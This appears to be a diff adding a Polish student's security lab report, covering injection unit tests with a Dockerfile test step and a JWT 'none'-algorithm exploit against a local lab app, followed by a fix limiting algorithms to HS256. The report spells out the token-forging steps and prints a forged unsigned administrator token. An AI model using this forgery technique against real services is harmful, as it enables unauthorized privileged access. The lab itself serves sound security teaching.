@@ -1,0 +1,95 @@
+Laboratorium 3 
+
+Monika Gardyjas
+
+Zadanie 1 - Przygotowanie rozszerzonego zestawu testów jednostowych
+
+Zadanie zrealizowałam na aplikacji Java. 
+
+W pliku StudentTests.java umieściłam testy jednostkowe pokrywające wskazane przypadki. Obejmują one m.in. próby ataku SQL i JavaScript Injection, ale i również zwykłe błędy w danych wejściowych, jak niepoprawny format e-mail lub ekstremalnie długi tekst. 
+
+W pliku Dockerfile umieściłam kod odpowiadający za uruchomienie tych testów automatycznie przy próbie zbudowania aplikacji i przerwanie jej w razie wyników negatywnych. 
+
+
+# Uruchom testy jednostkowe 
+RUN mvn test
+
+
+Wynik działania wprowadzonych zmian przy próbie uruchomienia aplikacji: 
+
+
+\task3\Java\spring-thymeleaf-crud-example> docker build -t task1-java .
+
+[...]
+ => ERROR [build 5/6] RUN mvn test                              135.8s
+------
+ > [build 5/6] RUN mvn test:
+2.184 [INFO] Scanning for projects...
+[...]
+135.4 [INFO]
+135.4 [ERROR] Tests run: 15, Failures: 9, Errors: 0, Skipped: 0
+135.4 [INFO]
+135.4 [INFO] ------------------------------------------------------------------------
+135.4 [INFO] BUILD FAILURE
+135.4 [INFO] ------------------------------------------------------------------------
+135.4 [INFO] Total time:  02:13 min
+135.4 [INFO] Finished at: 2025-12-02T20:57:30Z
+135.4 [INFO] ------------------------------------------------------------------------
+[...]
+ERROR: failed to solve: process "/bin/sh -c mvn test" did not complete successfully: exit code: 1
+
+
+
+Zadanie 2 - JWT — wykorzystanie podatności 
+
+Zgodnie z poleceniem uruchomiłam aplikację i zaimportowałam dostarczoną kolekcję do Postmana. W wyniku requesta 'none-ontain-token' otrzymałam odpowiedź: 
+
+{
+    "jwt": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2NvdW50IjoiQm9iIiwicm9sZSI6IlVzZXIiLCJpYXQiOjE3NjQ3MTA4MzYsImF1ZCI6Imh0dHBzOi8vMTI3LjAuMC4xL2p3dC9ub25lIn0.vZCOJdVCwWNbnEMxseYuRelNHfWVOrRz_C2rTljodwU",
+    "endpoint": "https://127.0.0.1/jwt/none"
+}
+
+Po przeklejeniu tego tokena do requesta 'none-send-token' otrzymałam w wyniku dane użytkownika Bob: 
+
+{
+    "message": "Congrats!! You've solved the JWT challenge!!",
+    "jwt_token": {
+        "header": {
+            "alg": "HS256",
+            "typ": "JWT"
+        },
+        "payload": {
+            "account": "Bob",
+            "role": "User",
+            "iat": 1764710836,
+            "aud": "https://127.0.0.1/jwt/none"
+        },
+        "signature": "vZCOJdVCwWNbnEMxseYuRelNHfWVOrRz_C2rTljodwU"
+    }
+}
+
+To dało mi dostęp do formatu tokenu i mogłam zacząć nim manipulować. Aby odnależć dane Administratora, musiałam odpowiednio go przerobić: podmieniłam typ algorytmu na "none", a nazwę konta na "Administrator", zakodowane w Base64 za pomocą enkodera online. Po usunięciu ostatniej sekcji, czyli podpisu, uzyskałam token:
+
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhY2NvdW50IjoiYWRtaW5pc3RyYXRvciIsInJvbGUiOiJVc2VyIiwiaWF0IjoxNzY0NTQ5ODA3LCJhdWQiOiJodHRwczovLzEyNy4wLjAuMS9qd3Qvbm9uZSJ9.
+
+Przekazanie go w requescie skutkowało udanym atakiem: 
+
+
+
+Zadanie 2 - JWT — realizacja poprawki 
+
+
+Naprawienie tej podatności wymagało prostej zmiany jednej z linii w pliku app.json, czyli usunięcia "none" z listy algorytmów akceptowanych do uwierzytelniania: 
+
+    JWT.verify(jwt_token, secret_key, { algorithms: ['HS256'], complete: true, audience: 'https://127.0.0.1/jwt/none' }, (err, decoded_token) => {
+
+
+Po ponownym uruchomieniu aplikacji, poprzedni atak nie jest już możliwy: 
+
+
+
+
+
+
+
+
